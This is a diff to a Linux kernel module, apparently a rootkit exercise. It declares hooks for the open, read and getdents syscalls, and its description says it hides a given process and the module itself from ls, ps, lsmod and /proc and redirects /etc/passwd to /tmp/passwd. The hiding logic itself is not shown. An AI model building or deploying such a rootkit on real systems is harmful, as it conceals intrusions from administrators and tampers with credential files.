@@ -9,10 +9,18 @@
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
 
+#define KERN_AUTHOR "Prathikshaa Rangarajan"
+#define KERN_DESC                                                              \
+  "Sneaky Module takes sneaky_pid as input.\nHides sneaky_process and "        \
+  "sneaky_module from: ls, cd, find, ls /proc, ps, lsmod.\ncat /etc/passwd "   \
+  "shows /tmp/passwd"
+
 // Module Param -- Take pid of sneaky process as input
-static int sneaky_pid;
+static int sneaky_pid = 0;
 module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(sneaky_pid, "PID of sneaky process.");
+
+// printk(KERN_INFO "PID of sneaky process: %d\n", sneaky_pid);
 
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -41,11 +49,26 @@ static unsigned long *sys_call_table =
 // The asmlinkage keyword is a GCC #define that indicates this function
 // should expect to find its arguments on the stack (not in registers).
 // This is used for all system calls.
+
+// open
 asmlinkage int (*original_open_call)(const char *pathname, int flags);
+// read
+asmlinkage ssize_t (*original_read_call)(int fd, void *buf, size_t count);
+// getdents struct
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[];
+};
+// getdents
+asmlinkage int (*original_getdents_call)(unsigned int fd,
+                                         struct linux_dirent *diro,
+                                         unsigned int count);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  printk(KERN_INFO "Sneaky: Open syscall\n");
   return original_open_call(pathname, flags);
 }
 
@@ -103,7 +126,8 @@ static void exit_sneaky_module(void) {
 }
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Prathikshaa Rangarajan");
+MODULE_AUTHOR(KERN_AUTHOR);
+MODULE_DESCRIPTION(KERN_DESC);
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
